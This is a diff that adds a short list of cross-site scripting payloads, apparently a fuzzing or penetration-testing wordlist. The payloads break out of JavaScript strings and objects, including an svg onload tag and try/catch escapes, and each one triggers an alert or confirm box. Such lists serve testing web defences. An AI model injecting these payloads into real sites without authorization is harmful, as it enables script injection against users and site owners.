@@ -1,0 +1,19 @@
+';alert('XSS');//
+“-confirm`1`-”
+\”-confirm`1`//
+\”}})})-confirm`1`//
+\”}})})-confirm`1`/*/
+\”}})})-confirm`1`;/*///
+\”}})})-confirm`1`;{/*///
+\”}})})-confirm`1`;({{/*///
+\”}})})-confirm`1`;({if(){/*///
+\”}})})-confirm`1`;({({if(){/*///
+\”}})})-confirm`1`;(function(){({if(){/*///
+\”}})})-confirm`1`(a=>{({b:{/*///
+/”><svg onload=alert(1)>
+jsinitfunctio%gn=alert`1`
+jsinitfunctio%25gn=alert(1)
+id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
+"]);}catch(e){}if(!self.a)self.a=!alert(1);//
+"]);}catch(e){}if(!self.a)self.a=!alert(1);//
+"]);}catch(e){}if(!self.a)self.a=!alert(1);//
